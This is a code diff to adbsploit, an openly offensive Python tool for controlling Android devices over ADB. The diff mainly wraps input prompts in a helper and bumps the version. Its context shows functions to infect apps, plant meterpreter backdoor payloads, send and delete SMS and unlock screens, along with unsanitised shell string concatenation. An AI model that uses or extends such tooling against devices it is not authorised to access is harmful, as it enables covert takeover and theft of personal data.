@@ -1,23 +1,41 @@
-import os
-import shutil
-import subprocess
-import sys
-import random
-
-import adbutils
-from colorama import Fore
-from pyfiglet import Figlet
-from rich.console import Console
-from rich.table import Table
-
+#!/usr/bin/python3
+# coding: utf8
+"""
+NOTE:
+	GitHub: https://github.com/mesquidar/adbsploit/
+	Pull request by WitBlack
+"""
+try:
+    import os
+    import shutil
+    import subprocess
+    import sys
+    import random
+    import adbutils
+    from colorama import Fore
+    from pyfiglet import Figlet
+    from rich.console import Console
+    from rich.table import Table
+except:
+    print('\x1b[0;31mSome deepends not installed.')
+    print('RUN: "pip install colorama rich adbutils pyfiglet" to install missing items.')
+    os.exit(1)
+    
 # ***********************************************************************
 # Variables and main
 arrow = Fore.RED + " └──>" + Fore.WHITE
 device = 'none'
 
 
+def my_input(text):
+    try:
+        return input(text)
+    except:
+        print(Fore.RED + '[*] ' + Fore.YELLOW + 'Exit.')
+        sys.exit(1)
+
 def main():
-    command = input(Fore.WHITE + "adbsploit" + Fore.RED + "(" + device + ")" + Fore.WHITE + " > ")
+    command = my_input(Fore.WHITE + "adbsploit" + Fore.RED + "(" + device + ")" + Fore.WHITE + " > ")
     if command == 'help':
         help()
         main()
@@ -217,14 +235,14 @@ def devices():
 
 def connect():
     print(("[{0}+{1}] Enter the phone IP address to connect").format(Fore.RED, Fore.WHITE))
-    dev = input(arrow + " adbsploit" + Fore.RED + "(connect) " + Fore.WHITE + "> ")
+    dev = my_input(arrow + " adbsploit" + Fore.RED + "(connect) " + Fore.WHITE + "> ")
     output = adbutils.adb.connect(dev)
     print(arrow + Fore.GREEN + " * " + output)
 
 
 def select():
     print(("[{0}+{1}] Enter the phone serial").format(Fore.RED, Fore.WHITE))
-    dev = input(arrow + " adbsploit" + Fore.RED + "(select) " + Fore.WHITE + "> ")
+    dev = my_input(arrow + " adbsploit" + Fore.RED + "(select) " + Fore.WHITE + "> ")
     output = adbutils.adb.device(serial=dev)
     global device
     try:
@@ -260,9 +278,9 @@ def forward():
     global device
     if device != 'none':
         print(("[{0}+{1}] Enter the local port to foward").format(Fore.RED, Fore.WHITE))
-        local = input(arrow + " adbsploit" + Fore.RED + "(forward) " + Fore.WHITE + "> ")
+        local = my_input(arrow + " adbsploit" + Fore.RED + "(forward) " + Fore.WHITE + "> ")
         print(("[{0}+{1}] Enter the remote port to forward").format(Fore.RED, Fore.WHITE))
-        remote = input(arrow + " adbsploit" + Fore.RED + "(forward) " + Fore.WHITE + "> ")
+        remote = my_input(arrow + " adbsploit" + Fore.RED + "(forward) " + Fore.WHITE + "> ")
         d = adbutils.adb.device(device)
         output = d.forward(local, remote)
         print(output)
@@ -276,7 +294,7 @@ def wifi():
     if device != 'none':
         d = adbutils.adb.device(device)
         print(("[{0}+{1}] Enter the state of the wifi (ON/OFF)").format(Fore.RED, Fore.WHITE))
-        state = input(arrow + " adbsploit" + Fore.RED + "(wifi) " + Fore.WHITE + "> ")
+        state = my_input(arrow + " adbsploit" + Fore.RED + "(wifi) " + Fore.WHITE + "> ")
         if state == 'on' or state == 'ON':
             d.shell('svc wifi enable')
             print(arrow + Fore.GREEN + 'The wifi is now enabled on the device')
@@ -335,7 +353,7 @@ def install():
     if device != 'none':
         try:
             print(("[{0}+{1}] Enter the apk path").format(Fore.RED, Fore.WHITE))
-            apk = input(arrow + " adbsploit" + Fore.RED + "(install) " + Fore.WHITE + "> ")
+            apk = my_input(arrow + " adbsploit" + Fore.RED + "(install) " + Fore.WHITE + "> ")
             d = adbutils.adb.device(device)
             d.install(apk)
             print(arrow + Fore.GREEN + 'APK installed successfully')
@@ -351,7 +369,7 @@ def install_remote():
     if device != 'none':
         try:
             print(("[{0}+{1}] Enter the apk URL").format(Fore.RED, Fore.WHITE))
-            url = input(arrow + " adbsploit" + Fore.RED + "(install_remote) " + Fore.WHITE + "> ")
+            url = my_input(arrow + " adbsploit" + Fore.RED + "(install_remote) " + Fore.WHITE + "> ")
             d = adbutils.adb.device(device)
             d.install_remote(url)
             print(arrow + Fore.GREEN + 'APK installed successfully')
@@ -367,7 +385,7 @@ def uninstall():
     if device != 'none':
         try:
             print(arrow + ("[{0}+{1}] Enter the package name").format(Fore.RED, Fore.WHITE))
-            app = input(arrow + " adbsploit" + Fore.RED + "(uninstall) " + Fore.WHITE + "> ")
+            app = my_input(arrow + " adbsploit" + Fore.RED + "(uninstall) " + Fore.WHITE + "> ")
             d = adbutils.adb.device(device)
             d.uninstall(app)
             print(arrow + Fore.GREEN + 'APK uninstalled successfully')
@@ -428,9 +446,9 @@ def get_folder():
     if device != 'none':
         try:
             print(arrow + ("[{0}+{1}] Enter the path of the folder to pull").format(Fore.RED, Fore.WHITE))
-            path = input(arrow + " adbsploit" + Fore.RED + "(get_folder) " + Fore.WHITE + "> ")
+            path = my_input(arrow + " adbsploit" + Fore.RED + "(get_folder) " + Fore.WHITE + "> ")
             print(arrow + ("[{0}+{1}] Enter the path of the destination").format(Fore.RED, Fore.WHITE))
-            name = input(arrow + " adbsploit" + Fore.RED + "(get_folder) " + Fore.WHITE + "> ")
+            name = my_input(arrow + " adbsploit" + Fore.RED + "(get_folder) " + Fore.WHITE + "> ")
             d = adbutils.adb.device(device)
             d.sync.pull(path, name)
         except:
@@ -445,7 +463,7 @@ def logs():
         try:
             print(arrow + ("[{0}+{1}] You want all the logs or only an app? (all/package_name) ").format(Fore.RED,
                                                                                                          Fore.WHITE))
-            app = input(arrow + " adbsploit" + Fore.RED + "(logs) " + Fore.WHITE + "> ")
+            app = my_input(arrow + " adbsploit" + Fore.RED + "(logs) " + Fore.WHITE + "> ")
             if app == "all":
                 os.system('adb -s ' + device + " logcat ")
             else:
@@ -461,9 +479,9 @@ def start_app():
     if device != 'none':
         try:
             print(arrow + ("[{0}+{1}] Specify the name of the app (ex: com.whatsapp) ").format(Fore.RED, Fore.WHITE))
-            app = input(arrow + " adbsploit" + Fore.RED + "(start_app) " + Fore.WHITE + "> ")
+            app = my_input(arrow + " adbsploit" + Fore.RED + "(start_app) " + Fore.WHITE + "> ")
             print(arrow + ("[{0}+{1}] Specify the activity, if not leave it blank) ").format(Fore.RED, Fore.WHITE))
-            activity = input(arrow + " adbsploit" + Fore.RED + "(start_app) " + Fore.WHITE + "> ")
+            activity = my_input(arrow + " adbsploit" + Fore.RED + "(start_app) " + Fore.WHITE + "> ")
             d = adbutils.adb.device(device)
             if activity == '':
                 d.app_start(app)
@@ -482,7 +500,7 @@ def stop_app():
     if device != 'none':
         try:
             print(arrow + ("[{0}+{1}] Specify the name of the app (ex: com.whatsapp) ").format(Fore.RED, Fore.WHITE))
-            app = input(arrow + " adbsploit" + Fore.RED + "(stop_app) " + Fore.WHITE + "> ")
+            app = my_input(arrow + " adbsploit" + Fore.RED + "(stop_app) " + Fore.WHITE + "> ")
             d = adbutils.adb.device(device)
             d.app_stop(app)
             print(Fore.GREEN + "The app " + app + " is now stopped...")
@@ -497,7 +515,7 @@ def clear_app():
     if device != 'none':
         try:
             print(arrow + ("[{0}+{1}] Specify the name of the app (ex: com.whatsapp) ").format(Fore.RED, Fore.WHITE))
-            app = input(arrow + " adbsploit" + Fore.RED + "(clear_app) " + Fore.WHITE + "> ")
+            app = my_input(arrow + " adbsploit" + Fore.RED + "(clear_app) " + Fore.WHITE + "> ")
             d = adbutils.adb.device(device)
             d.app_clear(app)
             print(Fore.GREEN + "The app " + app + " is now clear...")
@@ -525,7 +543,7 @@ def appinfo():
     if device != 'none':
         try:
             print(arrow + ("[{0}+{1}] Specify the name of the app (ex: com.whatsapp) ").format(Fore.RED, Fore.WHITE))
-            app = input(arrow + " adbsploit" + Fore.RED + "(appinfo) " + Fore.WHITE + "> ")
+            app = my_input(arrow + " adbsploit" + Fore.RED + "(appinfo) " + Fore.WHITE + "> ")
             d = adbutils.adb.device(device)
             print(Fore.GREEN + str(d.package_info(app)))
         except:
@@ -566,7 +584,7 @@ def airplane():
     if device != 'none':
         try:
             print(arrow + ("[{0}+{1}] Specify the name of the app (ex: com.whatsapp) ").format(Fore.RED, Fore.WHITE))
-            status = input(arrow + " adbsploit" + Fore.RED + "(airplane) " + Fore.WHITE + "> ")
+            status = my_input(arrow + " adbsploit" + Fore.RED + "(airplane) " + Fore.WHITE + "> ")
             d = adbutils.adb.device(device)
             if status == 'on':
                 d.switch_airplane(True)
@@ -589,9 +607,9 @@ def sound():
             print(
                 arrow + ("[{0}+{1}] Specify the type of sound to modify (media/call/system/notifications/all) ").format(
                     Fore.RED, Fore.WHITE))
-            type = input(arrow + " adbsploit" + Fore.RED + "(sound) " + Fore.WHITE + "> ")
+            type = my_input(arrow + " adbsploit" + Fore.RED + "(sound) " + Fore.WHITE + "> ")
             print(arrow + ("[{0}+{1}] Specify the sound leve 0-15 ").format(Fore.RED, Fore.WHITE))
-            set = input(arrow + " adbsploit" + Fore.RED + "(sound) " + Fore.WHITE + "> ")
+            set = my_input(arrow + " adbsploit" + Fore.RED + "(sound) " + Fore.WHITE + "> ")
             d = adbutils.adb.device(device)
             if type == 'media':
                 d.shell('media volume --stream 3 --set ' + set)
@@ -653,7 +671,7 @@ def keyevent():
     if device != 'none':
         try:
             print(arrow + ("[{0}+{1}] Specify the keyevent").format(Fore.RED, Fore.WHITE))
-            key = input(arrow + " adbsploit" + Fore.RED + "(keyevent) " + Fore.WHITE + "> ")
+            key = my_input(arrow + " adbsploit" + Fore.RED + "(keyevent) " + Fore.WHITE + "> ")
             d = adbutils.adb.device(device)
             d.keyevent(key)
             print(arrow + Fore.GREEN + "They key event is processed correctly...")
@@ -762,7 +780,7 @@ def open_browser():
     if device != 'none':
         try:
             print(arrow + ("[{0}+{1}] Specify the URL to open").format(Fore.RED, Fore.WHITE))
-            url = input(arrow + " adbsploit" + Fore.RED + "(open_browser) " + Fore.WHITE + "> ")
+            url = my_input(arrow + " adbsploit" + Fore.RED + "(open_browser) " + Fore.WHITE + "> ")
             d = adbutils.adb.device(device)
             if url != '':
                 d.open_browser(url)
@@ -800,15 +818,15 @@ def swipe():
     if device != 'none':
         try:
             print(arrow + ("[{0}+{1}] Specify sx in the screen").format(Fore.RED, Fore.WHITE))
-            sx = input(arrow + " adbsploit" + Fore.RED + "(swipe) " + Fore.WHITE + "> ")
+            sx = my_input(arrow + " adbsploit" + Fore.RED + "(swipe) " + Fore.WHITE + "> ")
             print(arrow + ("[{0}+{1}] Specify sy in the screen").format(Fore.RED, Fore.WHITE))
-            sy = input(arrow + " adbsploit" + Fore.RED + "(swipe) " + Fore.WHITE + "> ")
+            sy = my_input(arrow + " adbsploit" + Fore.RED + "(swipe) " + Fore.WHITE + "> ")
             print(arrow + ("[{0}+{1}] Specify ex in the screen").format(Fore.RED, Fore.WHITE))
-            ex = input(arrow + " adbsploit" + Fore.RED + "(swipe) " + Fore.WHITE + "> ")
+            ex = my_input(arrow + " adbsploit" + Fore.RED + "(swipe) " + Fore.WHITE + "> ")
             print(arrow + ("[{0}+{1}] Specify ey in the screen").format(Fore.RED, Fore.WHITE))
-            ey = input(arrow + " adbsploit" + Fore.RED + "(swipe) " + Fore.WHITE + "> ")
+            ey = my_input(arrow + " adbsploit" + Fore.RED + "(swipe) " + Fore.WHITE + "> ")
             print(arrow + ("[{0}+{1}] Specify the duration").format(Fore.RED, Fore.WHITE))
-            duration = input(arrow + " adbsploit" + Fore.RED + "(swipe) " + Fore.WHITE + "> ")
+            duration = my_input(arrow + " adbsploit" + Fore.RED + "(swipe) " + Fore.WHITE + "> ")
             d = adbutils.adb.device(device)
             d.swipe(sx, sy, ex, ey, duration)
             print(arrow + Fore.GREEN + ("The swipe is made..."))
@@ -823,7 +841,7 @@ def screen():
     if device != 'none':
         try:
             print(arrow + ("[{0}+{1}] Specify the status of the screen (on/off)").format(Fore.RED, Fore.WHITE))
-            status = input(arrow + " adbsploit" + Fore.RED + "(screen) " + Fore.WHITE + "> ")
+            status = my_input(arrow + " adbsploit" + Fore.RED + "(screen) " + Fore.WHITE + "> ")
             d = adbutils.adb.device(device)
             if status == 'on':
                 d.switch_screen(True)
@@ -848,7 +866,7 @@ def unlock_screen():
                 print(
                     arrow + ("[{0}+{1}] Specify the unlocking code, leave it blank if don't have code").format(Fore.RED,
                                                                                                                Fore.WHITE))
-                code = input(arrow + " adbsploit" + Fore.RED + "(unlock_screen) " + Fore.WHITE + "> ")
+                code = my_input(arrow + " adbsploit" + Fore.RED + "(unlock_screen) " + Fore.WHITE + "> ")
                 d.switch_screen(True)
                 d.swipe(200, 900, 200, 300, 0.5)
                 d.shell("input text " + str(code))
@@ -892,7 +910,7 @@ def screenshot():
     if device != 'none':
         try:
             print(arrow + ("[{0}+{1}] Specify the name of the screenshot").format(Fore.RED, Fore.WHITE))
-            name = input(arrow + " adbsploit" + Fore.RED + "(screenshot) " + Fore.WHITE + "> ")
+            name = my_input(arrow + " adbsploit" + Fore.RED + "(screenshot) " + Fore.WHITE + "> ")
             os.system("adb -s " + device + " exec-out screencap -p >" + name + ".png")
             print(arrow + Fore.GREEN + "An image is created with the name " + name + ".png ...")
         except:
@@ -906,7 +924,7 @@ def dump_meminfo():
     if device != 'none':
         try:
             print(arrow + ("[{0}+{1}] Specify the meminfo (all/package_name)").format(Fore.RED, Fore.WHITE))
-            app = input(arrow + " adbsploit" + Fore.RED + "(dump_meminfo) " + Fore.WHITE + "> ")
+            app = my_input(arrow + " adbsploit" + Fore.RED + "(dump_meminfo) " + Fore.WHITE + "> ")
             d = adbutils.adb.device(device)
             if app == 'all':
                 print(arrow + Fore.GREEN + d.shell("dumpsys meminfo"))
@@ -935,7 +953,7 @@ def tcpip():
     if device != 'none':
         try:
             print(arrow + ("[{0}+{1}] Specify the port").format(Fore.RED, Fore.WHITE))
-            port = input(arrow + " adbsploit" + Fore.RED + "(tcpip) " + Fore.WHITE + "> ")
+            port = my_input(arrow + " adbsploit" + Fore.RED + "(tcpip) " + Fore.WHITE + "> ")
             if port == '':
                 print(Fore.RED + "You must specify a port to listen on your device...")
             else:
@@ -983,7 +1001,7 @@ def delete_sms():
             print(arrow + ("[{0}+{1}] This option is still in BETA").format(Fore.RED, Fore.WHITE))
             d = adbutils.adb.device(device)
             print(arrow + ("[{0}+{1}] Specify row id").format(Fore.RED, Fore.WHITE))
-            row = input(arrow + " adbsploit" + Fore.RED + "(delete-sms) " + Fore.WHITE + "> ")
+            row = my_input(arrow + " adbsploit" + Fore.RED + "(delete-sms) " + Fore.WHITE + "> ")
             d.shell("content delete --uri content://sms/ --where" + '"row=' + "'" + row + "'" + '"')
             print('SMS Deleted')
         except:
@@ -999,9 +1017,9 @@ def send_sms():
             print(arrow + ("[{0}+{1}] This option is still in BETA").format(Fore.RED, Fore.WHITE))
             d = adbutils.adb.device(device)
             print(arrow + ("[{0}+{1}] Specify the phone number (+34600112233)").format(Fore.RED, Fore.WHITE))
-            number = input(arrow + " adbsploit" + Fore.RED + "(send-sms) " + Fore.WHITE + "> ")
+            number = my_input(arrow + " adbsploit" + Fore.RED + "(send-sms) " + Fore.WHITE + "> ")
             print(arrow + ("[{0}+{1}] Specify the sms message").format(Fore.RED, Fore.WHITE))
-            message = input(arrow + " adbsploit" + Fore.RED + "(send-sms) " + Fore.WHITE + "> ")
+            message = my_input(arrow + " adbsploit" + Fore.RED + "(send-sms) " + Fore.WHITE + "> ")
             d.shell(
                 "service call isms 7 i32 0 s16 " + "com.android.mms.service " + "s16 " + '"' + number + '"' + " s16 " + '"null"' + " s16 " + '"' + message + '"' + ' s16 "null" s16 "null"')
             print(arrow + Fore.GREEN + 'SMS Sent correctly...')
@@ -1067,7 +1085,7 @@ def kill_process():
         try:
             d = adbutils.adb.device(device)
             print(arrow + ("[{0}+{1}] Specify the PID").format(Fore.RED, Fore.WHITE))
-            pid = input(arrow + " adbsploit" + Fore.RED + "(kill-process) " + Fore.WHITE + "> ")
+            pid = my_input(arrow + " adbsploit" + Fore.RED + "(kill-process) " + Fore.WHITE + "> ")
             d.shell("taskkill /PID "+ pid)
             print(arrow+Fore.GREEN+"Killing the process...")
         except:
@@ -1086,7 +1104,7 @@ def screenrecord():
     global device
     if device != 'none':
         print(arrow + ("[{0}+{1}] Introduce the path and file name: (/home/user/Desktop/record.mp4)").format(Fore.RED, Fore.WHITE))
-        ans = input(arrow + " adbsploit" + Fore.RED + "(kill-process) " + Fore.WHITE + "> ")
+        ans = my_input(arrow + " adbsploit" + Fore.RED + "(kill-process) " + Fore.WHITE + "> ")
         try:
             if sys.platform.startswith('win32'):
                 if shutil.which("scrcpy") is not None:
@@ -1127,7 +1145,7 @@ def screenrecord():
                     print(arrow + (
                         "[{0}+{1}] ADBSploit use scrcpy to remote control, do you want to install it? (y/n)").format(
                         Fore.RED, Fore.WHITE))
-                    ans = input(arrow + " adbsploit" + Fore.RED + "(remote-control) " + Fore.WHITE + "> ")
+                    ans = my_input(arrow + " adbsploit" + Fore.RED + "(remote-control) " + Fore.WHITE + "> ")
                     if ans == "y" or ans == "Y":
                         subprocess.Popen('sudo apt-get install scrcpy', shell=True)
                     elif ans == "n" or ans == "N":
@@ -1156,7 +1174,7 @@ def screenrecord():
                     print(arrow + (
                         "[{0}+{1}] ADBSploit use scrcpy to remote control, do you want to install it? (y/n)").format(
                         Fore.RED, Fore.WHITE))
-                    ans = input(arrow + " adbsploit" + Fore.RED + "(remote-control) " + Fore.WHITE + "> ")
+                    ans = my_input(arrow + " adbsploit" + Fore.RED + "(remote-control) " + Fore.WHITE + "> ")
                     if ans == "y" or ans == "Y":
                         subprocess.call(
                             '/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)"',
@@ -1202,7 +1220,7 @@ def remote_control():
                                             stderr=subprocess.STDOUT,)
                 else:
                     print(arrow + ("[{0}+{1}] ADBSploit use scrcpy to remote control, do you want to install it? (y/n)").format(Fore.RED, Fore.WHITE))
-                    ans = input(arrow + " adbsploit" + Fore.RED + "(remote-control) " + Fore.WHITE + "> ")
+                    ans = my_input(arrow + " adbsploit" + Fore.RED + "(remote-control) " + Fore.WHITE + "> ")
                     if ans == "y" or ans == "Y":
                         subprocess.Popen('sudo apt-get install scrcpy',shell=True)
                     elif ans == "n" or ans == "N":
@@ -1222,7 +1240,7 @@ def remote_control():
                                             stderr=subprocess.STDOUT,)
                 else:
                     print(arrow + ("[{0}+{1}] ADBSploit use scrcpy to remote control, do you want to install it? (y/n)").format(Fore.RED, Fore.WHITE))
-                    ans = input(arrow + " adbsploit" + Fore.RED + "(remote-control) " + Fore.WHITE + "> ")
+                    ans = my_input(arrow + " adbsploit" + Fore.RED + "(remote-control) " + Fore.WHITE + "> ")
                     if ans == "y" or ans == "Y":
                         subprocess.call('/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)"',shell=True)
                         subprocess.call('brew install scrcpy', shell=True)
@@ -1247,7 +1265,7 @@ def evil_app():
         try:
             d = adbutils.adb.device(device)
             print(arrow + ("[{0}+{1}] Specify the App you want to infect: (com.whatsapp)").format(Fore.RED, Fore.WHITE))
-            app = input(arrow + " adbsploit" + Fore.RED + "(kill-process) " + Fore.WHITE + "> ")
+            app = my_input(arrow + " adbsploit" + Fore.RED + "(kill-process) " + Fore.WHITE + "> ")
             path = d.shell("pm path " + app)
             d.shell("pull " + path[8:])
 
@@ -1279,7 +1297,7 @@ def backdoor():
                 console = Console()
                 console.print(table)
                 print(arrow + ("[{0}+{1}] Specify the payload: (meterpreter_reverse_http)").format(Fore.RED, Fore.WHITE))
-                payload = input(arrow + " adbsploit" + Fore.RED + "(backdoor) " + Fore.WHITE + "> ")
+                payload = my_input(arrow + " adbsploit" + Fore.RED + "(backdoor) " + Fore.WHITE + "> ")
                 if payload == "":
                     print()
                 elif payload == "meterpreter_reverse_http":
@@ -1391,7 +1409,7 @@ if __name__ == '__main__':
             "standard", "stop"]
     f.setFont(font=random.choice(list))
     print(f.renderText('>_adbsploit'))
-    print("v0.2.1" + "\t \t \t \t" + "Developed by MesQ at " + Fore.RED + "https://github.com/mesquidar/adbsploit ")
+    print("v0.2.2" + "\t \t \t \t" + "Developed by MesQ at " + Fore.RED + "https://github.com/mesquidar/adbsploit ")
     print("")
     print(Fore.WHITE + "Type" + Fore.RED + " help " + Fore.WHITE + "for more info")
     main()
